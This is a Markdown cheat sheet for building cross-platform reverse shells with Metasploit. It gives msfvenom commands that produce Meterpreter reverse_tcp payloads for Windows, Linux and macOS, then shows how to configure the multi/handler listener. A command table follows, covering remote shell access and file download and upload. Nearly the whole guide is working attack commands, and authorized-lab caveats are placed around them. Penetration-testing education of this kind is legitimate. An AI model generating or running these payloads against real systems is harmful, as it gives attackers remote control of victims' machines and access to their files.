# 🚀 Cross-Platform Reverse Shell Guide

> A practical Metasploit quick-reference guide for authorized penetration testing and isolated lab environments.

Learn about local IP addresses, payload formats, Metasploit handlers, and Meterpreter commands.

---

## 📑 Table of Contents

- [1. Finding Your Local IP Address](#1-finding-your-local-ip-address)
- [2. Payload Generation](#2-payload-generation)
- [3. Setting Up the Metasploit Handler](#3-setting-up-the-metasploit-handler)
- [4. Meterpreter Command Reference](#4-meterpreter-command-reference)
- [5. Safety and Authorization](#5-safety-and-authorization)

---

## 1. Finding Your Local IP Address

Identify the IP address of the machine that will run your listener.

**🐧 Linux**
```bash
ip a
```

**🍎 macOS**
```bash
ipconfig getifaddr en0
```

**🪟 Windows**
```powershell
ipconfig
```

> **Note:** Choose the correct network interface. `127.0.0.1` is the loopback address and generally cannot be used to reach a listener from another machine.

---

## 2. Payload Generation

For an authorized lab, select the payload architecture and format appropriate to your target system.

Replace `<YOUR_IP>` with your listener's IP address and `<YOUR_PORT>` with your chosen port.

### 🪟 Windows

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  lhost=<YOUR_IP> \
  lport=<YOUR_PORT> \
  -f psh-cmd > payload.bat
```

### 🐧 Linux — x64

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  lhost=<YOUR_IP> \
  lport=<YOUR_PORT> \
  -f elf > payload.elf
```

For an authorized Linux lab target, executable permissions may be required:

```bash
chmod +x payload.elf
```

### 🍎 macOS — Apple Silicon

```bash
msfvenom -p osx/aarch64/meterpreter/reverse_tcp \
  lhost=<YOUR_IP> \
  lport=<YOUR_PORT> \
  -f macho > payload.macho
```

For an authorized macOS lab target, executable permissions may be required:

```bash
chmod +x payload.macho
```

---

## 3. Setting Up the Metasploit Handler

Start Metasploit:

```bash
msfconsole -q
```

Select the multi-handler module:

```text
use exploit/multi/handler
```

Configure the handler to match the payload used in your lab.

**Windows**
```text
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <YOUR_IP>
set LPORT <YOUR_PORT>
```

**Linux**
```text
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST <YOUR_IP>
set LPORT <YOUR_PORT>
```

**macOS — Apple Silicon**
```text
set PAYLOAD osx/aarch64/meterpreter/reverse_tcp
set LHOST <YOUR_IP>
set LPORT <YOUR_PORT>
```

Start the handler:

```text
exploit
```

or, 

```text
run
```

> **Important:** The handler and corresponding lab payload must use matching payload types, IP addresses, and ports.

---

## 4. Meterpreter Command Reference

Use these commands to navigate an established, authorized Meterpreter lab session.

| Command | Description |
|---|---|
| `help` | Display available commands. |
| `sysinfo` | Display operating system and system information. |
| `getuid` | Display the session's current user identity. |
| `pwd` | Print the current working directory. |
| `ls` | List files and directories. |
| `shell` | Open an interactive system shell, where supported. |
| `background` | Return to the Metasploit prompt while keeping the session in the background. |
| `download` | Transfer an authorized file from the remote session. |
| `upload` | Transfer an authorized file to the remote session. |

To explore available commands and options:

```text
help
```

---

## 5. Safety and Authorization

This guide is intended for educational use, authorized penetration testing, and isolated cybersecurity labs.

- Obtain explicit authorization before testing any system.
- Use intentionally vulnerable virtual machines or controlled lab targets.
- Never execute payloads on systems without permission.
- Keep lab environments isolated and remove test artifacts when finished.

**Learn responsibly. Test legally. Secure what you build.** 🔐

---

<p align="center">
  <sub>📚 Cybersecurity Learning Notes · Metasploit Framework · Authorized Lab Use Only</sub>
</p>
